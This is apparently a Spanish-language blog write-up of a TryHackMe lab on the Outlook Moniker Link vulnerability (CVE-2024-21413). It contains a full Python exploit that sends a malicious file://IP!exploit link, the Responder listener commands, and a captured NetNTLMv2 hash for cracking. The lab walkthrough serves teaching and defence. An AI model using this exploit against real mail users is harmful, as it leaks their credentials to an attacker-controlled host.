---
layout: single
title: Moniker Link (CVE-2024-21413) - TryHackMe
excerpt: "En este post vamos a estar aprendiendo sobre la vulnerabilidad CVE-2024-21413 que afecta algunas versiones de Outlook y gracias a un tipo específico de hipervínculo conocido como Monitor Link el atacante puede aprovecharse de esto para robar el hash NTLM del usuario víctima."
date: 2024-03-25
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/try-writeup-outlook/icon.png
  teaser_home_page: true
  icon: /assets/images/tryhackme.webp
categories:
  - TryHackMe
tags:  
  - CVE-2024-21413
  - Monitor Link
---

## Introducción

- El 13 de febrero del 2024 **Microsoft** anuncio una vulnerabilidad en la cual puedes obtener ejecución remota de comandos o **RCE** y fuga de credenciales en **Microsoft Outlook**, la vulnerabilidad hace un **bypass** a los mecanismos de seguridad de **Outlook** al manejar un tipo específico de hipervínculo conocido como **Monitor Link**. El atacante puede aprovecharse de esto enviando un correo electrónico que contiene el hipervínculo **Monitor Link** malicioso ala víctima lo que hace que **Outlook** envíe las credenciales **NTLM** del usuario al atacante una vez allá hecho clic en el hipervínculo <https://research.checkpoint.com/2024/the-risks-of-the-monikerlink-bug-in-microsoft-outlook-and-the-big-picture/>, <[https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413)>.

- Aquí nos dan los detalles de la vulnerabilidad:

<p align="center">
<img src="https://i.imgur.com/bN8dV75.png">
</p>

- Y estas son las versiones que la vulnerabilidad afecta.

<p align="center">
<img src="https://i.imgur.com/HIOVZrs.png">
</p>

## Moniker Link (CVE-2024-21413)

- Bueno, en el **Task 2** nos explican la vulnerabilidad sobre como funciona, además de que nos habré la máquina **Windows** con **Outlook** que es donde estaremos del lado de la víctima donde nos llegara el correo.

<p align="center">
<img src="https://i.imgur.com/2SwhgBA.png">
</p>

- Nos dicen que **Outlook** puede mostrar correos electrónicos como **HTML**, además de que **Outlook** puede analizar hipervínculos como **HTTPS y HTTP** y puede abrir **URL** que especifiquen aplicaciones conocidas como **Moniker Links**, pero normalmente **Outlook** lanza una advertencia de seguridad cuando se activan las aplicaciones externas en ese momento se activa la **Vista protegida de Outlook**.

> La vista protegida de **Outlook** abre correos electronicos que contienen archivos adjuntos, hipervinculos y contenido en modo lectura bloqueando cosas como macros.

- Al usar el `Moniker Link file://` en nuestro hipervínculo, podemos instruir a Outlook para que intente acceder a un archivo, como un archivo en una carpeta compartida en red (`<a href="file://IP_DEL_ATACANTE/test>Haz clic aquí</a>`). Se utiliza el protocolo **SMB**, que implica el uso de credenciales locales para la autenticación. Sin embargo, la "Vista protegida" de Outlook detecta y bloquea este intento.

- La vulnerabilidad aquí existe al modificar nuestro hipervínculo para incluir el carácter especial ! y algo de texto en nuestro `Moniker Link`, lo que resulta en hacer un `bypass` a  la Vista protegida de Outlook. Por ejemplo: `<a href="file://IP_DEL_ATACANTE/test!exploit>Haz clic aquí</a>`.

- Nosotros, como atacantes, podemos proporcionar un `Moniker Link` para el ataque. Ten en cuenta que la carpeta compartida no necesita existir en la máquina víctima, ya que se intentará una autenticación de todos modos, lo que llevará al envío del hash netNTLMv2 de Windows de la víctima al atacante que podemos crackear después.

## Explotación 

- Bueno, para explotar esta vulnerabilidad existe un **PoC** donde nos explican como se explota <https://github.com/CMNatic/CVE-2024-21413>.

<p align="center">
<img src="https://i.imgur.com/E12ej7s.png">
</p>

- Vamos a descargarnos el **exploit**.

```bash
➜  Outlook wget https://raw.githubusercontent.com/CMNatic/CVE-2024-21413/main/exploit.py
```

- Vamos a modificar el exploit con los datos que nos piden.

```python
'''
Author: CMNatic | https://github.com/cmnatic
Version: 1.1 | 13/03/2024
Only run this on systems that you own or are explicitly authorised to test (in writing). Unauthorised scanning, testing or exploitation is illegal.
'''

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'attacker@monikerlink.thm' # Replace with your sender email address
receiver_email = 'victim@monikerlink.thm' # Replace with the recipient email address
password = input("Enter your attacker email password: ")
html_content = """\
<!DOCTYPE html>
<html lang="en">
    <p><a href="file://10.2.11.77/test!exploit">Click me</a></p>

    </body>
</html>"""

message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413"
message["From"] = formataddr(('CMNatic', sender_email))
message["To"] = receiver_email

# Convert the HTML string into bytes and attach it to the message object
msgHtml = MIMEText(html_content,'html')
message.attach(msgHtml)

server = smtplib.SMTP('10.10.12.104', 25)
server.ehlo()
try:
    server.login(sender_email, password)
except Exception as err:
    print(err)
    exit(-1)

try:
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\nEmail delivered")
except Exception as error:
    print(error)
finally:
    server.quit()
```

> El script en **Python3** lo que hace es enviar el correo a **Outlook** con el hipervinculo donde define el contenido **HTML** del correo electronico malicioso ademas de que configura un servidor **SMTP** con la direccion de correo electronico del atacante en el puerto 25.

- Vamos a ejecutar el exploit con las credenciales que nos ofrecen para no usar las de nosotros **Requires the password to authenticate. For this room, the password for `attacker@monikerlink.thm` is `attacker`**

```bash
➜  Outlook python3 exploit.py
Enter your attacker email password: attacker

Email delivered
```

- Vemos que el correo está allí:

<p align="center">
<img src="https://i.imgur.com/vGqnKW7.png">
</p>

- Ahora para obtener el **hash** del usuario, simplemente nos pondremos con la herramienta **responder** para estar en escucha.

```bash
➜  Outlook sudo responder -I tun0
[sudo] password for miguel:
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.2.11.77]
    Responder IPv6             [fe80::b913:9538:26bf:9d7a]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-OS9JHAD135I]
    Responder Domain Name      [JZ2I.LOCAL]
    Responder DCE-RPC Port     [49745]

[+] Listening for events...
```

- Ahora le vamos a dar **click** al enlace que enviamos mediante el correo electrónico.

<p align="center">
<img src="https://i.imgur.com/TJcbKLf.png">
</p>

- Ahora ya nos llega el **hash**.

```bash
➜  Outlook sudo responder -I tun0
[sudo] password for miguel:
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.2.11.77]
    Responder IPv6             [fe80::b913:9538:26bf:9d7a]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-OS9JHAD135I]
    Responder Domain Name      [JZ2I.LOCAL]
    Responder DCE-RPC Port     [49745]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.12.104
[SMB] NTLMv2-SSP Username : THM-MONIKERLINK\tryhackme
[SMB] NTLMv2-SSP Hash     : tryhackme::THM-MONIKERLINK:f23da6fe78c2d842:3D90B933A4FE8891D6B2A0BE8675E2E5:0101000000000000809DFD89B97EDA0132AF187DB5040A7D00000000020008004A005A003200490001001E00570049004E002D004F00530039004A00480041004400310033003500490004003400570049004E002D004F00530039004A0048004100440031003300350049002E004A005A00320049002E004C004F00430041004C00030014004A005A00320049002E004C004F00430041004C00050014004A005A00320049002E004C004F00430041004C0007000800809DFD89B97EDA0106000400020000000800300030000000000000000000000000200000C3CCE90BFB56A0AFEFB39C8DD508F50ED1BBA8D9CFA10C77D54F263517FD024E0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E0032002E00310031002E0037003700000000000000000000000000
[*] Skipping previously captured hash for THM-MONIKERLINK\tryhackme
```

- Con el **hash** ya podrías crackear el **hash**.
